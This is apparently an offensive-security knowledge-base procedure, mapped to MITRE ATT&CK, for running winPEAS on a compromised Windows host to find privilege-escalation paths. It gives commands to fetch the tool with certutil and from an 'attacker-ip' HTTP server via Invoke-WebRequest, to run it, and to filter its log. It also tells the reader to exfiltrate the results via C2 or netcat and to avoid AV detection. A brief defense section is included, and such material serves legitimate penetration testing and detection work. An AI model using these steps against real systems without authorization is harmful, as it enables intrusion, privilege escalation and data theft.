---
id: ca896a3e-65e7-4bce-863b-b7d948a2df2e
name: Enumerate-Windows-for-Privilege-Escalation-with-winPEAS
type: procedure
verified: true
submitted: true
created_at: '2020-03-12T23:11:13.842303+00:00'
updated_at: '2023-05-25T20:02:31.435623+00:00'
tactics:
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Account Discovery|T1087 - Account Discovery]]'
  - >-
    [[techniques/File and Directory Discovery|T1083 - File and Directory
    Discovery]]
  - >-
    [[techniques/File System Permissions Weakness|T1044 - File System
    Permissions Weakness]]
  - >-
    [[techniques/Permission Groups Discovery|T1069 - Permission Groups
    Discovery]]
  - '[[techniques/Process Discovery|T1057 - Process Discovery]]'
  - >-
    [[techniques/System Information Discovery|T1082 - System Information
    Discovery]]
  - >-
    [[techniques/System Network Configuration Discovery|T1016 - System Network
    Configuration Discovery]]
  - '[[techniques/System Service Discovery|T1007 - System Service Discovery]]'
sub_techniques: []
tags:
  - '[[tags/Enumeration]]'
  - '[[tags/privileges]]'
commands:
  - '[[commands/winpeas-execute-enumeration]]'
platforms:
  - Windows
tools:
  - '[[tools/winPEAS]]'
validated: true
---

# Enumerate-Windows-for-Privilege-Escalation-with-winPEAS

## Summary

This procedure uses winPEAS, a Windows Privilege Escalation Awesome Script, to systematically enumerate a Windows system for potential privilege escalation vectors. It identifies vulnerable software, misconfigurations, sensitive files, weak permissions, and other common priv esc paths, providing a comprehensive report to guide further exploitation in red team engagements or penetration tests.

## Description

winPEAS is a script designed to automate the discovery of privilege escalation opportunities on Windows systems. It checks for items such as unquoted service paths, weak service permissions, scheduled tasks with high privileges, vulnerable installed software, credential dumps in memory or files, and system information that could aid in lateral movement or escalation. This procedure is typically used post-initial access on a compromised Windows host where the user has limited privileges, aiming to uncover paths to SYSTEM or administrator-level access. The output is a detailed log file highlighting potential issues, which can be exfiltrated for analysis. It maps to various MITRE ATT&CK discovery techniques as it gathers account, file, process, service, and system information to identify weaknesses.

## Requirements

1. Access to a compromised Windows host with command prompt or PowerShell execution rights (e.g., via initial foothold like a reverse shell).
2. winPEAS executable downloaded and transferred to the target (requires outbound internet or prior staging).
3. Administrative privileges not required to run, but low-privilege execution is common for stealth.
4. Tools for file transfer if needed (e.g., certutil for download).

## Defense

Defensive measures include enabling Windows Defender Application Control (WDAC) to restrict unsigned executables like winPEAS, monitoring for anomalous process execution via Sysmon or EDR tools, restricting file writes to sensitive directories, and auditing scheduled tasks/services for modifications. Detection can focus on command line arguments involving enumeration tools or unexpected network downloads.

## Objectives

1. Identify misconfigurations and weak permissions that enable privilege escalation.
2. Enumerate system details for potential exploitation vectors like vulnerable services or credentials.
3. Generate a report for offline analysis to chain into further attacks.

## Instructions

### Step 1: Obtain winPEAS Executable

**Context**: Download the latest winPEAS executable from its GitHub repository to ensure it includes current checks for Windows updates and vulnerabilities. This step prepares the tool for transfer to the target.

Use a command like certutil (built-in on Windows) to download directly if internet access is available, or stage it via your C2 framework.

**Command** ([[commands/winpeas-download-with-certutil]]):
```command_prompt
certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe winPEAS.exe
```

> This fetches the 64-bit executable. Verify the download with a hash check if possible. Expected: File winPEAS.exe created in current directory.

### Step 2: Transfer Executable to Target (If Needed)

**Context**: If not downloaded on-target, transfer the executable using available methods like SMB, HTTP server, or C2 beacon. This ensures the tool is available for execution without alerting AV.

For example, host the file on an attacker-controlled HTTP server and use PowerShell to download.

**Command** ([[commands/powershell-download-file]]):
```powershell
Invoke-WebRequest -Uri http://attacker-ip/winPEAS.exe -OutFile .\winPEAS.exe
```

> Assumes outbound HTTP access. Expected: winPEAS.exe appears in the target directory. If blocked, use alternative transfer like base64 encoding over existing channel.

### Step 3: Execute winPEAS for Enumeration

**Context**: Run the winPEAS executable to perform the full enumeration. It will generate dynamic lists and scan for priv esc vectors, producing a detailed output log. Run from a low-privilege directory to minimize detection.

Navigate to a temporary directory like %TEMP% and execute.

**Command** ([[commands/winpeas-execute-enumeration]]):
```command_prompt
winPEAS.exe
```

> No parameters needed for basic run; use -h for options like quiet mode or specific checks. Expected: Console output showing progress (e.g., "Creating Dynamic lists..."), followed by sections on users, services, software, credentials, etc. A log file (winPEAS.log) is generated with color-coded highlights for potential issues.

### Step 4: Analyze and Exfiltrate Output

**Context**: Review the output for high-value findings like weak services or creds, then exfiltrate the log for further analysis. Decision point: If AV triggers, clean up immediately.

Search the log for keywords like "Potential" or "Vulnerable" using built-in tools.

**Command** ([[commands/findstr-search-log]]):
```command_prompt
findstr /i "vulnerable weak potential" winPEAS.log > findings.txt
```

> This filters key sections. Expected: findings.txt with relevant lines. Exfiltrate via your C2 or netcat. If no issues found, consider running with additional flags like winPEAS.exe systeminfo.
